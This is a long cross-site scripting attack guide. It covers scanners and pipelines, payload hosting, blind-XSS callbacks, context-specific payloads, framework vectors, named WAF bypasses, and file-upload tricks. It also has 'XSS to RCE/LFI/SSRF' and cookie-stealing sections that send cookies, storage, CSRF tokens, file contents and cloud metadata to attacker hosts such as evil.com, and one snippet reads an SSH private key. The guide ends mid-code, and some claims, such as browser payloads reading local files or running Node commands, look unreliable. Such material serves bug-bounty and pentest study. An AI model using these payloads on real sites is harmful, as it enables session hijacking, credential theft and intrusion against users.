# Complete XSS (Cross-Site Scripting) Guide

## Table of Contents
1. [XSS Scanning Tools](#xss-scanning-tools)
2. [XSS Payload Hosting](#xss-payload-hosting)
3. [Payload Lists & Resources](#payload-lists--resources)
4. [Advanced Exploitation](#advanced-exploitation)
5. [Blind XSS](#blind-xss)
6. [XSS in Different Contexts](#xss-in-different-contexts)
7. [WAF Bypass Techniques](#waf-bypass-techniques)
8. [Framework-Specific XSS](#framework-specific-xss)
9. [Real-World Examples](#real-world-examples)
10. [XSS to RCE/LFI/SSRF](#xss-to-rcelfissrf)
11. [XSS in File Upload](#xss-in-file-upload)
12. [XSS Payload Categories](#xss-payload-categories)

---

## XSS Scanning Tools

### Dalfox - Fast XSS Scanner
```bash
# Basic scan
dalfox url http://testphp.vulnweb.com/listproducts.php

# Expected output:
# [POC][G][WEAK] http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>
# [POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat="><svg/onload=alert(45)>

# With blind XSS callback
dalfox url http://testphp.vulnweb.com/listproducts.php -b https://your-blind-server.xss.ht

# Pipe mode with other tools
echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe -b https://six2dez.xss.ht
```

### Gxss - Parameter Replacement Tool
```bash
# Replace every param value with word FUZZ
echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100

# Expected output:
# https://target.com/some.php?first=FUZZ&last=world
# https://target.com/some.php?first=hello&last=FUZZ

# With waybackurls integration
echo "domain.com" | waybackurls | Gxss -c 100 -p Xss | sort -u
```

### XSpear - Advanced XSS Scanner
```bash
# Install
gem install XSpear

# Basic scan with all tests
XSpear -u 'https://web.com' -a

# With cookies and blind callback
XSpear -u 'https://www.web.com/?q=123' --cookie='role=admin' -v 1 -a -b https://six2dez.xss.ht -t 20

# Parameter specific test
XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -p test -v 1
```

### Xira - Another XSS Tool
```bash
# Clone and run
git clone https://github.com/xadhrit/xira
cd xira
python3 xira.py -u url
```

### Complete Automation Pipeline
```bash
# WaybackUrls + Gxss + Dalfox pipeline
echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe -b https://six2dez.xss.ht

# ParamSpider + Dalfox
paramspider -d target.com > /filepath/param.txt && dalfox -b https://six2dez.xss.ht file /filepath/param.txt

# Blind XSS discovery
cat target_list.txt | waybackurls -no-subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace -a | dalfox pipe -b https://six2dez.xss.ht

# Reflected XSS with pattern finding
echo "domain.com" | waybackurls | gf xss | kxss
```

---

## XSS Payload Hosting

### Surge.sh - Free Static Hosting
```bash
# Install surge
npm install --global surge

# Create and deploy payload
mkdir mypayload
cd mypayload
echo "alert(1)" > payload.js
surge  # Returns URL like: https://your-project.surge.sh

# Use in XSS:
<script src="https://your-project.surge.sh/payload.js"></script>
```

### Alternative Hosting Methods
```bash
# GitHub Gist (raw content)
https://gist.githubusercontent.com/username/gist-id/raw/payload.js

# Pastebin raw
https://pastebin.com/raw/PASTE_ID

# Your own server
python3 -m http.server 8080
# Then: <script src="http://YOUR_IP:8080/payload.js"></script>
```

---

## Payload Lists & Resources

### Primary Payload Repositories
```bash
# Comprehensive payload list
https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt

# Tiny XSS payloads
https://github.com/terjanq/Tiny-XSS-Payloads

# XSS vectors collection
https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45

# Ultimate XSS Polyglot
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
```

### Basic Locator/Detector Payload
```html
'';!--"<XSS>=&{()}
```
**Where to place:** Any input field, URL parameter, or form field to test if special characters are filtered.

---

## Advanced Exploitation Tools

### JSshell - XSS to RCE
```bash
# https://github.com/shelld3v/JSshell
# Allows command execution through XSS
```

### XSSTRON - XSS Browser
```bash
# https://github.com/RenwaX23/XSSTRON
# Browser-based XSS exploitation framework
```

### Blind XSS Tools
```bash
# bXSS - Blind XSS detection
https://github.com/LewisArdern/bXSS

# ezXSS - Blind XSS management
https://github.com/ssl/ezXSS

# XSS Hunter - Commercial blind XSS
https://xsshunter.com/

# vaya-ciego-nen - Blind XSS tool
https://github.com/hipotermia/vaya-ciego-nen
```

---

## Blind XSS

### What is Blind XSS?
Blind XSS occurs when the payload is stored and executed in a context not directly visible to the attacker (admin panel, log viewer, moderation dashboard).

### Detection Methods
```bash
# 1. XSS Hunter payload in every field
# 2. Review forms - especially contact us pages
# 3. Password fields (if view mode exists)
# 4. Address fields on e-commerce sites
# 5. First/Last name during credit card payments
# 6. Set User-Agent to XSS payload via Burp
# 7. Log viewers and admin dashboards
# 8. Feedback pages
# 9. Chat applications
# 10. Any app requiring user moderation
# 11. Host header injection
# 12. "Why cancel subscription?" forms
```

### Blind XSS Callback Payloads
```html
<!-- XSS Hunter style -->
<script src="https://your-blind-server.xss.ht"></script>

<!-- Custom callback -->
<script>fetch('https://your-server.com/steal?cookie='+document.cookie)</script>

<!-- Image-based callback -->
<img src="x" onerror="this.src='https://your-server.com/log?c='+document.cookie">
```

---

## XSS in Different Contexts

### Context 1: HTML Body (Tag Injection)
**When:** User input is placed directly in HTML body
```html
<!-- Vulnerable code: -->
<div>User input: <?php echo $_GET['q']; ?></div>

<!-- Payload: -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Context 2: Inside HTML Attributes
**When:** Input is inside a tag attribute value
```html
<!-- Vulnerable code: -->
<input type="text" value="<?php echo $_GET['q']; ?>">

<!-- Payloads: -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onclick="alert(1)
' onmouseover='alert(1)
```

### Context 3: Inside JavaScript String
**When:** Input is inside a JavaScript string literal
```javascript
// Vulnerable code:
<script>
    var user = "<?php echo $_GET['name']; ?>";
</script>

// Payloads:
"; alert(1); //
"-alert(1)-"
'; alert(1); //
'-alert(1)-'
\'; alert(1); //
```

### Context 4: Inside JavaScript Code (No Quotes)
**When:** Input is directly embedded in JavaScript
```javascript
// Vulnerable code:
<script>
    var id = <?php echo $_GET['id']; ?>;
</script>

// Payloads:
1; alert(1); //
1, alert(1), 1
1} alert(1); {1
```

### Context 5: URL Parameter Injection
**When:** Input is used in a URL/href
```html
<!-- Vulnerable code: -->
<a href="page.php?redirect=<?php echo $_GET['url']; ?>">Click</a>

<!-- Payloads: -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
https://evil.com" onclick="alert(1)
```

### Context 6: CSS Context
**When:** Input is injected into CSS
```html
<!-- Vulnerable code: -->
<style>
    .header { background-image: url('<?php echo $_GET['bg']; ?>'); }
</style>

<!-- Payloads: -->
'); } alert(1); { background: url('x
'); expression(alert(1))//
</style><script>alert(1)</script>
```

### Context 7: HTML Comments
**When:** Input is inside HTML comments
```html
<!-- Vulnerable code: -->
<!-- User comment: <?php echo $_GET['comment']; ?> -->

<!-- Payload: -->
--><script>alert(1)</script><!--
```

---

## Framework-Specific XSS

### WordPress XSS Vectors

#### WordPress Admin Panel XSS
```html
<!-- WordPress Dashboard - Widget Title -->
"><svg onload=alert(1)>

<!-- WordPress Comment Form -->
<a title="' onmouseover=alert(1)//">Click</a>

<!-- WordPress Search -->
?search=<script>alert(1)</script>

<!-- WordPress Post Slug -->
/wp-admin/post.php?post=1&action=edit&post_name="><script>alert(1)</script>

<!-- WordPress Theme Customizer -->
/wp-admin/customize.php?url="><script>alert(1)</script>

<!-- WordPress Plugin Settings -->
/wp-admin/options-general.php?page=plugin-name&setting="><svg/onload=alert(1)>
```

#### WordPress Specific Payloads
```html
<!-- WordPress Shortcode Injection -->
[embed src='javascript:alert(1)']

<!-- WordPress Gallery Shortcode -->
[gallery ids='1,2,3 onmouseover=alert(1)']

<!-- WordPress Audio Shortcode -->
[audio src="x" onerror=alert(1)]

<!-- WordPress Video Shortcode -->
[video src="x" onerror=alert(1)]

<!-- WordPress Caption Shortcode -->
[caption title="' onmouseover=alert(1)//"]caption[/caption]
```

### AngularJS XSS (v1.6+)

#### AngularJS Sandbox Escapes
```html
<!-- Basic Angular injection (v1.6+) -->
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}

<!-- Alternative Angular payloads -->
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('import("https://six2dez.xss.ht")')()}}
{{$on.constructor('alert(1)')()}}

<!-- Without parentheses -->
{{{}.")));alert(1)//"}}
{{{}.")));alert(1)//"}}

<!-- OrderBy sandbox escape -->
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>

<!-- AngularJS CSP bypass -->
<script>
location='https://your-lab.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

### React JS XSS

#### React Dangerous HTML
```jsx
// Vulnerable pattern
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Payloads that work
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<a href="javascript:alert(1)">click</a>
```

#### React JSX Context
```jsx
// React Router params
<Route path="/user/:id" component={UserComponent} />
// URL: /user/<script>alert(1)</script>

// React State injection
<div>{userInput}</div>  // Still safe due to escaping
// But href attribute is dangerous:
<a href={userInput}>Link</a>  // javascript:alert(1) works
```

### Vue.js XSS

```html
<!-- Vue.js v-html directive -->
<div v-html="userInput"></div>
<!-- Payload: <img src=x onerror=alert(1)> -->

<!-- Vue.js template injection -->
{{constructor.constructor('alert(1)')()}}
```

### jQuery XSS

```javascript
// Vulnerable patterns
$('#element').html(userInput)
$('<div>' + userInput + '</div>').appendTo('body')
$('element').append(userInput)

// Payloads that bypass jQuery escaping
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

// jQuery AJAX dataType script
$.get('data:/javascript,alert(1)')  // Firefox only
```

### Drupal XSS

```html
<!-- Drupal search -->
?search=<script>alert(1)</script>

<!-- Drupal node title -->
/node/1?title="><svg/onload=alert(1)>

<!-- Drupal CKEditor WYSIWYG -->
<img src="x" onerror="alert(1)" />
```

### Joomla XSS

```html
<!-- Joomla search -->
/index.php?option=com_search&searchword=<script>alert(1)</script>

<!-- Joomla article introtext -->
/index.php?option=com_content&view=article&id=1&introtext="><svg/onload=alert(1)>
```

### Laravel Blade XSS

```php
// Vulnerable patterns
{!! $userInput !!}  // Raw output - DANGEROUS
{{ $userInput }}    // Escaped - SAFE

// Payload for {!! !!}:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## WAF Bypass Techniques

### Cloudflare Bypass
```html
<!-- Using Unicode -->
<svg/onload=alert(1)>
<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Using line breaks -->
<svg\nonload=alert(1)>
<svg/onload=\u0061lert(1)>

<!-- Using character encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116(1)>
```

### Imperva Incapsula Bypass
```html
<!-- Using hex escaping -->
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E

<!-- Using JSFuck -->
<img/src="x"/onerror="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]])()">  <!-- alert(1) -->
```

### CloudFront (AWS) Bypass
```html
<!-- Using case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG Src=x OnErRoR=alert(1)>

<!-- Using character substitution -->
<svg/onload=\u0061lert(1)>
<script>eval('\x61lert(1)')</script>
```

### ModSecurity Bypass
```html
<!-- Using whitespace variation -->
<a href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert(1);">XSS</a>

<!-- Using comment separators -->
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>

<!-- Using HTML entities -->
<a href="javas&Tab;cript:alert(1)">XSS</a>
```

### Sucuri WAF Bypass
```html
<!-- Using fraction slash unicode -->
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4

<!-- Using hex entities -->
<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

### Akamai WAF Bypass
```html
<!-- Null byte injection -->
<SCr%00Ipt>confirm(1)</scR%00ipt>

<!-- Character encoding -->
%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E

<!-- JavaScript protocol variation -->
javascript:alert(1)
JaVaScRiPt:alert(1)
jAvAsCrIpT:alert(1)
```

### Barracuda WAF Bypass
```html
<!-- Using wheel event -->
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```

### F5 Big-IP ASM Bypass
```html
<!-- Using wheel event with encoded payload -->
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```

### WebKnight Bypass
```html
<!-- Using details ontoggle -->
<details ontoggle=alert(1)>

<!-- Using context menu -->
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
```

### PHP-IDS Bypass
```html
<!-- Using plus sign -->
<svg+onload=+"alert(1)"

<!-- Using encoded percent -->
<svg+onload=+"aler%25%37%34(1)"
```

---

## Real-World Examples

### Example 1: Facebook XSS (Past)
```html
<!-- Facebook flash XSS (CVE-2014-XXXX) -->
<object data="//target.swf" allowscriptaccess="always">
```

### Example 2: Google XSS
```html
<!-- Google Search XSS vector -->
/search?q=%3Csvg%2Fonload%3Dalert(1)%3E
```

### Example 3: Twitter XSS
```html
<!-- Twitter DM XSS -->
[IMG]javascript:alert(1)[/IMG]
```

### Example 4: Amazon XSS
```html
<!-- Amazon product review XSS -->
<img src="x" onerror="alert(document.cookie)">
```

### Example 5: eBay XSS
```html
<!-- eBay item description XSS -->
<iframe src="javascript:alert(1)"></iframe>
```

---

## XSS to RCE/LFI/SSRF

### XSS to RCE (Remote Code Execution)
```html
<!-- Node.js RCE via XSS -->
<script>
  const { exec } = require('child_process');
  exec('id', (err, output) => {
    fetch('https://evil.com/steal?output=' + btoa(output));
  });
</script>

<!-- Java applet RCE -->
<applet code="Exploit.class" width="1" height="1"></applet>

<!-- Electron RCE -->
<script>require('child_process').exec('calc.exe')</script>
```

### XSS to LFI (Local File Inclusion)
```html
<!-- Read /etc/passwd -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.onload = function() {
    document.write('<pre>' + this.responseText + '</pre>');
  };
  xhr.open('GET', 'file:///etc/passwd');
  xhr.send();
</script>

<!-- Image-based LFI -->
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>

<!-- Multi-file LFI -->
<script>
  var files = ['/etc/passwd', '/etc/hosts', '/etc/hostname'];
  files.forEach(function(file) {
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      fetch('https://evil.com/log?file=' + btoa(file) + '&content=' + btoa(this.responseText));
    };
    xhr.open('GET', 'file://' + file);
    xhr.send();
  });
</script>

<!-- SSH key theft -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.onload = function() {
    document.write('<pre>' + this.responseText + '</pre>');
  };
  xhr.open('GET', 'file:///home/reader/.ssh/id_rsa');
  xhr.send();
</script>
```

### XSS to SSRF (Server-Side Request Forgery)
```html
<!-- ESI injection for SSRF -->
<esi:include src="http://yoursite.com/capture" />

<!-- Internal network scanning -->
<script>
  var internalIPs = ['10.0.0.1', '172.16.0.1', '192.168.1.1'];
  internalIPs.forEach(function(ip) {
    var img = new Image();
    img.src = 'http://' + ip + ':8080/health';
    img.onerror = function() {
      fetch('https://evil.com/steal?ip=' + ip + '&port=8080&alive=false');
    };
    img.onload = function() {
      fetch('https://evil.com/steal?ip=' + ip + '&port=8080&alive=true');
    };
  });
</script>

<!-- AWS metadata SSRF -->
<script>
  var img = new Image();
  img.src = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  img.onload = function() {
    fetch('https://evil.com/steal?aws_creds=' + btoa(img.src));
  };
</script>
```

### XSS to Session Hijacking
```html
<!-- Steal cookies and session -->
<script>
  var img = new Image();
  img.src = 'https://evil.com/steal?cookies=' + document.cookie;
  
  // Also steal localStorage and sessionStorage
  var storage = JSON.stringify(localStorage);
  var session = JSON.stringify(sessionStorage);
  
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: storage,
      sessionStorage: session
    })
  });
</script>

<!-- Steal CSRF token and perform action -->
<script>
  var csrfToken = document.querySelector('input[name="csrf_token"]').value;
  
  fetch('https://evil.com/steal?csrf=' + csrfToken);
  
  // Change user email
  fetch('/change-email', {
    method: 'POST',
    body: 'csrf_token=' + csrfToken + '&email=hacker@evil.com'
  });
</script>
```

---

## XSS in File Upload

### Filename XSS
```bash
# Create malicious filename
cp somefile.txt \"\>\<img\ src\ onerror=prompt\(1\)\>

# Rename to XSS payload
mv image.jpg "<img src=x onerror=alert('XSS')>.png"
mv image.jpg "\"><img src=x onerror=alert('XSS')>.png"
mv image.svg "\"><svg onmouseover=alert(1)>.svg"
mv image.png "<<script>alert('xss')<!--a-->a.png"
mv image.gif "\"><svg onload=alert(1)>.gif"
```

### XSS in Image Metadata (EXIF)
```bash
# Install exiftool
sudo apt install exiftool

# Inject XSS into Artist field
exiftool -Artist=' "><img src=1 onerror=alert(document.domain)>' image.jpg
exiftool -Artist='"><script>alert(1)</script>' image.jpg

# Inject into other fields
exiftool -Copyright='"><svg onload=alert(1)>' image.jpg
exiftool -Comment='<script>alert(1)</script>' image.jpg
exiftool -ImageDescription='javascript:alert(1)' image.jpg
```

### XSS in SVG Files
```svg
<!-- Basic SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<!-- Onload SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<!-- SVG with polygon and script -->
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert('XSS!');
  </script>
</svg>

<!-- Remote SVG injection -->
<iframe src="https://evil.com/exploit.svg" frameborder="0"></iframe>
```

### XSS in GIF Magic Number
```bash
# Create GIF with XSS payload
echo "GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;" > xss.gif

# If image can't load, reference it
http://target.com/test.php?p=<script src=http://evil.com/upload/xss.gif>
```

### XSS in PNG
```bash
# PNG with JavaScript (CSP bypass)
# Reference: https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/
```

### XSS in PDF
```html
<!-- PDF JavaScript injection -->
<script>
  app.alert('XSS');
  this.print({bUI: true, bSilent: false, bShrinkToFit: true});
</script>

<!-- Reference: https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html -->
```

### XSS in XML Files
```xml
<!-- XML XSS -->
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>

<!-- XML with CDATA -->
<xml>
  <![CDATA[<script>alert(1)</script>]]>
</xml>

<!-- XML with external entity -->
<?xml version="1.0" encoding="UTF-8"?>
<html xmlns:html="http://w3.org/1999/xhtml">
<html:script>prompt(document.domain);</html:script>
</html>
```

---

## XSS Payload Categories

### Basic Alert Payloads
```html
<!-- Simple alert -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>

<!-- Onload events -->
<body onload=alert(1)>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Event handlers -->
<div onclick="alert(1)">click</div>
<button onmouseover="alert(1)">hover</button>
<input onfocus="alert(1)" autofocus>
```

### No Parentheses Payloads
```html
<!-- Throw technique -->
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>

<!-- Instanceof technique -->
<script>'alert\x281\x29' instanceof {[Symbol.hasInstance]: eval}</script>

<!-- Location technique -->
<script>location='javascript:alert\x281\x29'</script>

<!-- Template literal -->
<script>alert`1`</script>

<!-- Function constructor -->
<script>new Function`X${document.location.hash.substr`1`}``</script>
```

### No Parentheses, No Semicolons
```html
<!-- Object destructuring -->
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>

<!-- Multiple statements -->
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
```

### No Parentheses, No Spaces
```html
<script>Function`X${document.location.hash.substr`1`}```</script>
```

### Angle Brackets HTML Encoded (In Attributes)
```html
<!-- In attribute context -->
" onmouseover="alert(1)
' -alert(1)-'
```

### Quote Escaped Bypass
```html
<!-- When quotes are escaped with backslash -->
' }alert(1);{ '
' }alert(1)%0A{ '
\' }alert(1);{ //
```

### Embedded Whitespace Bypass
```html
<!-- Tab, newline, carriage return -->
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

### Regex Bypass
```html
<img src="X" onerror=top[8680439..toString(30)](1337)>
```

### Base64 Payloads
```html
<!-- Base64 encoded alert -->
<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
<!-- Decodes to: alert('XSS') -->

<!-- Multiple base64 -->
<svg/onload=eval(atob('YWxlcnQoJ2hlbGxvJyk='))>
```

### Unicode Payloads
```html
<!-- Unicode escapes -->
<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>

<!-- Mixed encoding -->
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
```

### Hex Payloads
```html
<script>eval('\x61lert(1)')</script>
<img src=x onerror=eval('\x61lert(1)')>
```

### HTML Entity Payloads
```html
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
```

### URL Encoded Payloads
```html
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
<iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529"></iframe>
```

### Double URL Encoded Payloads
```html
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
```

### HTML + URL Encoded Payloads
```html
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
```

### Unicode + HTML Payloads
```html
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
```

### Advanced Polyglot Payloads
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>
```

```javascript
javascript:alert();//<img src=x:x onerror=alert(1)>";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!--
```

### Multi-Vector Polyglot
```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

### No Parenthesis, Backticks, Brackets, Quotes, Braces
```javascript
a=1337,b=confirm,c=window,c.onerror=b;throw-a
```

### Uncommon Payloads
```javascript
// Find technique
'-(a=alert,b="_Y000!_",[b].find(a))-'

// Array prototype
[].map.constructor`alert(1)```

// Set prototype
new Set().constructor`alert(1)```
```

### Onscroll Payload
```html
<p style="overflow:auto;font-size:999px" onscroll=alert(1)>AAA<x/id=y></p>#y
```

### Content Security Policy (CSP) Bypass
```javascript
// FWS technique
FWS ='BACONBACON'-alert(1)//

// GIF technique
GIF89a='MUMBOJUMBOBOGUSBACON';alert(1)//

// Meta tag downgrade
<meta http-equiv="X-UA-Compatible" content="IE=7" />
<meta content="whatever=EmulateIE7" http-equiv="X-UA-Compatible">
```

### HTML Injection Context-Specific
```html
<!-- Inside HTML -->
<svg onload=alert(1)>
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- Parameter splitting -->
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
<script src=data:,alert(1)>
```

### Inline Attribute Payloads
```html
" onmouseover=alert(1) //
" autofocus onfocus=alert(1) //
" onclick=alert(1) //
" onload=alert(1) //
" onerror=alert(1) //
```

### JavaScript Injection
```javascript
'-alert(1)-'
'/alert(1)//
\'/alert(1)//
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
/alert(1)//\
/alert(1)}//\
${alert(1)}
```

### Polyglot for Filter Testing
```html
%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
```

```html
<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#
```

### GO SSTI XSS
```go
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`
```

---

## Cookie Stealing Payloads

### Basic Cookie Stealer
```html
<script>
  var i = new Image();
  i.src = "http://evil.com:8888/?" + document.cookie;
</script>

<img src=x onerror=this.src='http://evil.com:8888/?'+document.cookie;>

<img src=x onerror="this.src='http://evil.com:8888/?'+document.cookie; this.removeAttribute('onerror');">
```

### Advanced Cookie Stealer with Fetch
```html
<script>
  fetch('http://evil.com/steal', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      domain: document.domain,
      referrer: document.referrer
    })
  });
</script>
```

### WebSocket Cookie Stealer
```html
<script>
